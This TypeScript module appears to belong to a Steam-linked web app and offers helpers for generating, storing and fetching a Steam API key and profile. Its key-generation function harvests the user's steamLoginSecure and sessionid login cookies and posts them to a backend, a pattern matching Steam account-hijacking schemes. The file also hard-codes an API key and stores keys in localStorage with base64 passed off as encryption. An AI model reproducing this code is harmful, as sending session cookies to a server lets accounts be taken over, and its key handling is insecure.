import { formatCurrency } from './currency';
import { adminService } from '../services/adminService';
import { sendDiscordNotification } from './discord';
import { SteamProfile } from '../types/steam';

interface SteamApiResponse {
  apikey?: string;
  success: boolean;
  error?: string;
}

// Steam API key for fetching public profile data (this is just for demo purposes)
const STEAM_API_KEY = '2CF8B1E4D5B3A6F9C7E0D812456789AB'; // Replace with your actual Steam API key in production

// Base URL for API calls
const API_BASE_URL = 'http://localhost:3002';

export const generateSteamApiKey = async (steamId: string): Promise<SteamApiResponse> => {
  try {
    // Get Steam session information from cookies
    const steamLoginSecure = document.cookie
      .split('; ')
      .find(row => row.startsWith('steamLoginSecure='))
      ?.split('=')[1];

    const sessionId = document.cookie
      .split('; ')
      .find(row => row.startsWith('sessionid='))
      ?.split('=')[1];

    if (!steamLoginSecure || !sessionId) {
      throw new Error('Steam session information not found. Please make sure you are logged into Steam.');
    }

    const response = await fetch(`${API_BASE_URL}/api/steam/generate-key`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ 
        steamId,
        steamLoginSecure,
        sessionId
      }),
      credentials: 'include'
    });

    if (!response.ok) {
      throw new Error('Failed to generate API key');
    }

    const data = await response.json();
    return {
      success: true,
      apikey: data.apiKey
    };
  } catch (error) {
    console.error('Error generating Steam API key:', error);
    return {
      success: false,
      error: error instanceof Error ? error.message : 'Failed to generate API key'
    };
  }
};

export const storeSteamApiKey = (steamId: string, apiKey: string): void => {
  try {
    console.log('Storing API key for Steam ID:', steamId);
    // In a production environment, you would want to store this securely
    // For now, we'll use localStorage with encryption
    const encryptedKey = btoa(apiKey); // Basic encoding (not secure for production)
    localStorage.setItem(`steam_api_key_${steamId}`, encryptedKey);
    console.log('Successfully stored API key');
  } catch (error) {
    console.error('Error storing Steam API key:', error);
  }
};

export const getSteamApiKey = (steamId: string): string | null => {
  try {
    const encryptedKey = localStorage.getItem(`steam_api_key_${steamId}`);
    if (!encryptedKey) return null;
    return atob(encryptedKey); // Basic decoding (not secure for production)
  } catch (error) {
    console.error('Error retrieving Steam API key:', error);
    return null;
  }
};

export const logSteamApiKeyGeneration = async (steamId: string, success: boolean, error?: string) => {
  try {
    await fetch(`${API_BASE_URL}/api/steam/log-key-generation`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        steamId,
        success,
        error
      }),
      credentials: 'include'
    });
  } catch (error) {
    console.error('Error logging API key generation:', error);
  }
};

export const fetchSteamProfile = async (steamId: string, apiKey?: string): Promise<SteamProfile | null> => {
  try {
    let key = apiKey;
    if (!key) {
      key = localStorage.getItem('steam_api_key') || undefined;
    }
    if (!key) {
      throw new Error('Steam API key is required to fetch profile');
    }
    const response = await fetch('http://localhost:3002/api/steam/profile', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ steamId, apiKey: key }),
    });
    if (!response.ok) {
      throw new Error('Failed to fetch Steam profile from proxy');
    }
    const data = await response.json();
    const player = data.response.players[0];
    if (!player) return null;
    const profile: SteamProfile = {
      personaname: player.personaname,
      avatarmedium: player.avatarmedium,
      steamid: player.steamid
    };
    localStorage.setItem('steam_profile', JSON.stringify(profile));
    return profile;
  } catch (error) {
    console.error('Error fetching Steam profile:', error);
    return null;
  }
};

export const getSteamProfile = (): SteamProfile | null => {
  try {
    // We'll still cache the profile in localStorage for performance
    // but the source of truth will be the backend
    const profile = localStorage.getItem('steam_profile');
    return profile ? JSON.parse(profile) : null;
  } catch (error) {
    console.error('Error getting Steam profile from storage:', error);
    return null;
  }
}; 